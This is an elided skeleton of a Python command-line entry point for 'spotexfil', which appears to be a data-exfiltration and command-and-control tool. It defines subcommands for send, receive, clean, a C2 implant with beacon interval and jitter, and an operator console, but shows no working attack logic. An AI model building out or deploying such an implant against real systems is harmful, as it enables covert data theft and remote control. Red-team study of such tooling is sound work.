...
Single entry point for send, receive, cleanup, and C2 operations.
...
Usage:
    ...
    spotexfil clean
    spotexfil c2-implant -k KEY [--interval 60] [--jitter 30]
    spotexfil c2-operator -k KEY
"""

import argparse
import sys

from . import crypto as encoding
...
def build_parser():
    ...
    # --- c2-implant ---
    imp_p = sub.add_parser('c2-implant', help='Run C2 implant')
    imp_p.add_argument(
        '-k', '--key', required=True,
    ...
    # --- c2-operator ---
    op_p = sub.add_parser('c2-operator', help='Run C2 operator console')
    op_p.add_argument(
        '-k', '--key', required=True,
...
def cmd_c2_implant(args):
    """Handle the c2-implant subcommand."""
...
def cmd_c2_operator(args):
    """Handle the c2-operator subcommand."""
...
def main():
    ...
    dispatch = {
        ...
        'receive': cmd_receive,
        'clean': cmd_clean,
        'c2-implant': cmd_c2_implant,
        'c2-operator': cmd_c2_operator,
    }
